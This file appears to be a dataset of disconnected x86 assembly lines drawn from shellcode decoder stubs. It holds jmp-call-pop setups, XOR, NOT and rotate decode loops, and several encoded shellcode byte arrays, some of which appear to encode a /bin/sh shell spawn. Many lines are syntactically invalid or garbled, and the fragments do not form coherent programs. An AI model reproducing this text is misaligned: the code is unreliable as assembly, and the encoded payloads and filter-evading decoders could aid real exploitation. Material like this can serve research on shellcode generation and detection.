_start :
"mov eax , 67"
_start : \n jmp short call_decoder
_start : \n jmp call_decoder
_start : \n jmp call_decoder
_start : \n jmp short call_decoder
_start : \n jmp short call_decoder
_start : \n jmp short call_shellcode
_start : \n jmp short call_shellcode
_start : \n jmp short call_shellcode
_start : \n jmp short enc
_start : \n jmp stage
"add al , 0x2"
"add al , 3"
"add byte [esi] , 0x02"
"add byte [esi] , 0x10"
"add eax , 4 \n jnz decode"
"add eax , ebx"
"add ebp , 0x2"
"add edi , 2"
"add esi , 2"
call decoder
call decoder var0
call decoder_setup
call returnlabel
call_decoded : \n call [esp]
call_decoder :
call_decoder :
call_decoder : \n call function_2
call_decoder : \n call function_1
call_decoder : \n call decoder
call_decoder : \n call [esp]
call_shellcode :
call_shellcode :
call_shellcode : \n call function_1
call_shellcode : \n call decoder
call_shellcode : \n call function_2
call_shellcode :
call_shellcode :
check_even_odd :
"cmp al , cl \n jne short decode \n jmp shellcode"
jz shellcode
jz xordecode \n jmp notdecode
"cmp BYTE 0x88 , 0x88 \n je shellcode"
"cmp BYTE [esi] , bl \n jne not_equal"
scasd \n je execute_shellcode
common_commands : \n inc esi
cycle :
dec al \n jz shellcode
"sub ebx , 1"
"mov eax , 67"
decode_pr :
decode :
call var0
decode :
decode :
decode :
decode : \n jmp common_commands \n jmp common_commands
"mov eax , 63"
decode : \n not byte [esi]
"decode : \n sub byte [esi] , 13"
"decode : \n xor byte [esi] , 0xaa"
decoded_shellcode : \n call [esp]
decoder_setup :
decoder :
decoder :
decoder :
decoder :
"decoder eax , 2"
"mov eax , 1"
decoder :
decoder : \n pop esi
decoder : \n pop esi
esi : \n pop edi
enc : \n call decoder
"encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"encoded_shellcode : equ 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x5e7 , 0x5d5 , 0x5cf , 0x411 , 0x4eb , 0x443 , 0x509 , 0x48d , 0x423 , 0x539"
"db 0xaa , 0x62 , 0xc0 , 0xaa , 0xa0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0x5e , 0xaa , 0xe6 , 0xaa , 0xd0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0xc4 , 0xaa , 0xd2 , 0xaa , 0xdc , 0x89 , 0xe3 , 0xaa , 0xa0 , 0x89 , 0xe2 , 0xaa , 0xa6 , 0x89 , 0xe1 , 0xb0 , 0xaa , 0x16 , 0xcd , 0x80 , 0xbb"
"db 0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539"
encodedshellcode db ë ^~1À°1Û óªu\ GëíèÞÿÿÿ1ªÀªPªhª/ª/ªsªhªhª/ªbªiªnªªãªPªªâªSªªáª°ª ªÍªª»»
"var db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce"
"encodedshellcode : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xbc , 0xc9 , 0xe3 , 0x7a , 0xaf , 0x7a , 0x78 , 0xe , 0xc5 , 0xda , 0x76 , 0x6a , 0x17 , 0x1a , 0x4e , 0x68 , 0x38 , 0xc2 , 0x99 , 0xfb , 0x35 , 0x68 , 0x84 , 0xd2 , 0xb3 , 0xcb , 0x7c , 0x68 , 0x78 , 0xe2 , 0x9a , 0xf5 , 0xe9 , 0x50 , 0xc0 , 0x24 , 0x91 , 0xf8 , 0xfe"
"var db 0xd6 , 0x47 , 0xb7 , 0x9f , 0xd8 , 0xd8 , 0x94 , 0x9f , 0x9f , 0xd8 , 0xa5 , 0x9e , 0x99 , 0x7e , 0x24 , 0xb7 , 0x7e , 0x25 , 0xb4 , 0x7e , 0x26 , 0x57 , 0xfc , 0x3a , 0x87"
"var db 0xeb , 0x0c , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0xf6 , 0x16 , 0x46 , 0xe2 , 0xfb , 0xeb , 0x05 , 0xe8 , 0xef , 0xff , 0xff , 0xff , 0xce , 0x3f , 0xaf , 0x97 , 0xd0 , 0xd0 , 0x8c , 0x97 , 0x97 , 0xd0 , 0x9d , 0x96 , 0x91 , 0x76 , 0x1c , 0xaf , 0x76 , 0x1d , 0xac , 0x76 , 0x1e , 0x4f , 0xf4 , 0x32 , 0x7f"
"encoder_shellcode : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb3 , 0xfe , 0xb9 , 0x1e , 0x4e , 0xfd , 0x97 , 0x70 , 0x39 , 0xb0 , 0x6a , 0xdb , 0xb0 , 0xc4 , 0x09 , 0xcf , 0x74 , 0x25 , 0x76 , 0xe6 , 0xe6 , 0xe6 , 0xf6 , 0x90 , 0x90 , 0xaa , 0xaa"
even_number :
execute_shellcode : \n jmp short esp
format :
formatting
get_shellcode_addr :
global _start
global _start
inc dx
inc eax \n inc eax
inc eax \n inc eax
inc ecx \n inc ecx
inc ecx \n inc ecx
inc edi \n inc edi
inc edi
inc edx \n inc edx
inc edx \n inc edx
inc esi \n inc esi
inc esi \n inc esi
"lea e , [esi+1]"
inc esi \n inc esi
inc esi \n inc esi
inc esi \n inc esi
inc esi \n jmp L1
inc_dec :
jmp decode
jmp short call_decoder
"mov eax , 1"
jmp short call_shellcode
jmp short cycle
jmp short decode
jmp short decode
jmp start decode
goto : \n decode decode_pr
jmp short get_shellcode_addr
jmp short inc_dec
jmp short main
"mov eax , 1"
jmp short switch
jz decoded_shellcode
"lea edi , [edi+2]"
"lea edi , [esi+13]"
"lea edi , [esi]"
"lea edi , [esi]"
"lea edi , [esi]"
"lea edi , [esi+0x1]"
"lea esi , [esi+2]"
"sub eax , 1 \n jnz check_even_odd \n jmp shellcode"
jnz decode
loop edx \n jmp edx
loop decode \n jmp decode \n jmp decode \n jmp decode
loop decode \n jmp decode \n jmp shellcode
loop decode \n jmp shellcode
loop decode \n jmp decode \n jmp decode
"sub eax , 1 \n jnz decode \n jmp shellcode"
loop encoded_shellcode \n jmp encoded_shellcode
lowbound :
main :
"mov edi , al"
"mov [edi] , al"
"xchg al , esi"
"mov al , byte esi"
"mov al , byte [esi]"
"mov al , esi+1+ebp"
"mov eax , al"
"mov ax , dl"
"mov al , dl"
"mov ax , [esi]"
mov word edi+1+ecx
"mov bh , bl"
"mov bh , esi+edx+2"
"mov bl , byte [esi]"
"mov bl , 0x7"
"mov bl , 0xff"
"mov bl , byte [eax]"
"mov bl , byte edi+ecx"
"bl , byte [edi]"
"mov bl , byte esi+eax +1"
"mov bl , byte esi+eax"
"mov bl , byte esi+edi"
push byte esi+edx+1 \n pop bl
"bl , byte [esi]"
"mov bl , byte esi+eax*1"
"mov bl , byte [esi+eax*1+0x1]"
"mov byte [esi+ecx+1] , 0x7"
"mov bl , cl"
"mov bx , [esi]"
"mov byte [eax] , dl"
"mov edi , bl"
"mov byte [edi] , bl \n not byte [edi]"
"mov byte [edi] , bl"
"mov byte [bl] , bl"
"mov byte [esi+1] , dl"
"mov byte [bl] , bl"
"mov byte [esi] , dl"
"mov byte [bl] , bl"
"mov byte [esp+eax+1] , cl"
"mov byte [esp+eax+2] , bh"
"mov byte [esp+eax+3] , bl"
"mov byte [esp] , ch"
"mov byte [bl] , bl"
push byte esi+edx+4 \n pop ch
"mov byte [counter] , 10"
"mov cl , 13"
"mov cl , al"
"mov cl , byte eax"
"mov cl , esi+edx+3"
"mov eax , dl"
"mov dl , esi-1"
"mov byte [esi] , previous byte [esi]"
"mov eax , dl \n inc eax"
"mov dl , 0x45"
"mov dl , 0xff"
"mov dl , byte eax+1"
"mov dl , byte eax"
"mov dl , esi+1"
"mov dl , byte esi+edi+1"
"mov dl , esi"
"mov eax , edi"
"mov ecx , ebp"
"mov edi , 0xaaaa9090"
"mov edi , shellcode"
"mov edx , esp"
"mov edi , ax"
negative : \n not dl \n inc dl
next_cycle : inc edi \n jmp short formatting
nop
not_equal :
notdecode :
odd_number :
pop esi
pop esi
pop esi
pop esi
"pop esi \n mov cl , [esi]"
push ebp
"push esi \n mov edi , esp"
returnlabel :
"rol shellcode , 1"
"ror cl , bl"
"rol esi , shellcode"
section .text
shellcode_length equ $-shellcode
shellcode_section : \n call [esp]
shellcode : equ $-shellcode
shellcode : equ $-shellcode
cdq
"db 0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d"
shellcode : equ $-shellcode
"db 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa"
"db 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb"
"db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a"
shellcode : equ $-shellcode
shift_decode :
"rol eax , 28"
"rol eax , 28"
"shr ax , 1"
"shr ax , cl \n not word ax"
"shr bl , 2"
"shr dl , 1"
"shr dl , 4"
shr d 24
"shr eax , 28"
stage : \n call function_0
"sub ax , 13"
"sub bl , al"
"sub byte [esi] , 0x05"
"sub byte [esi] , 8 \n not byte [esi]"
"sub cl , dl"
"sub esp , al \n jns decode_pr"
"sub dx , bx"
"sub esp , 4"
"sub esp , 0x7f"
switch :
"shr esi , esi"
"xchg al , 0x05"
"xor al , bl \n jz short shellcode"
"xor ax , 0x539"
"xor ax , bx"
"xor ax , bx \n jz call decoded"
"xor bh , byte [esi+0]"
"xor bl , 0xaa \n jnz encodedshellcode"
"xor bl , 0xbb \n jz encoded"
"xor bl , 0xbb \n jz formatting \n mov cl , byte [esi]"
"xor byte [bl] , esi+edx"
"xor bl , dl \n jnz short shellcode"
"xchg byte [esi] , 0x88"
"xchg byte [esi] , 0x97"
"xor byte [esi] , dl"
"xor byte [esi] , dl"
"xor byte [esi] , dl"
"xor byte [esi+1] , dl"
"xor byte [ch] , esi+edx"
"xor cl , 0x32 \n jz short encodedshellcode"
"xor cl , 0xaa \n jnz next_cycle"
"xor cl , 0xaa \n jz decode"
"xor cl , byte [esi+edx]"
"xor dl , 0xbb \n jz next_cycle"
"xor eax , eax \n mov dl , 0x1"
"xor eax , eax \n mov dl , 22"
"xor ebx , ebx"
"xor eax , eax \n xor eax , eax \n xor eax , eax \n xor eax , eax"
"xor eax , eax \n xor eax , eax \n xor eax , eax"
"xor eax , eax \n xor eax , eax \n xor eax , eax"
"xor ebp , ebp"
"xor ebx , ebx"
"xor ebx , ebx \n mov cl , [esi+1]"
"xor edx , edx"
"xor ecx , ecx"
"xor ecx , ecx \n mov dl , 0x19"
"xor 0x1e , 0x1e \n mov dl , 0x1e"
"xor ecx , ecx \n mov dl , 23"
"xor ecx , ecx \n mov dl , 25"
"xor shellcode_length , shellcode_length \n mov dl , shellcode_length"
"xor ecx , ecx"
x68732f2f
"xor edx , edx \n xor edx , edx"
"xor eax , eax"
"xor edi , edi \n xor edi , edi \n xor edi , edi"
"xor edx , edx \n mov cl , [esi+1]"
xordecode :
